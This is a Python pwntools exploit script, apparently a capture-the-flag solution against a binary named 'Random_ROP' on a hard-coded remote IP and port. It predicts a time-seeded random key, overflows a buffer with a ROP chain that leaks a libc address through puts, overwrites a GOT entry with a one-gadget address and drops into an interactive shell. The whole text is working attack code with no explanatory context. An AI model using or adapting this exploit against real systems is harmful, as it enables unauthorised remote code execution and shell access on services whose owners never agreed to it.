from pwn import *
from ctypes import *

context.log_level = 'debug'

#p = process('./Random_ROP')
p = remote('211.170.162.121', 3333)

c = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
c.srand(c.time(0))
key = c.rand()

e = ELF('./Random_ROP')
#l = e.libc
l = ELF('./libc.so.6')


puts_plt = 0x4006fc
gets_plt = 0x400780

puts_got = 0x602018
gets_got = 0x602058

p_rdi_r = 0x0000000000400b43

main = 0x000000004009E4
pause()

### libc leak
p.sendlineafter('INPUT ID : ', 'a')
p.sendlineafter('INPUT PW : ', 'a')

p.recv()
p.sendline(str(key))

payload = 'a' * 0x400 + 'b' *8

payload += p64(p_rdi_r)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(p_rdi_r)
payload += p64(puts_got)
payload += p64(gets_plt)
payload += p64(puts_plt)
payload += p64(0) * 50

p.sendline(payload)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - l.sym['puts']
log.info('libc : ' + hex(libc))

p.recv()
#p.sendline(p64(libc + 0x4526a))
p.sendline(p64(libc + 0x4f322))

p.interactive()
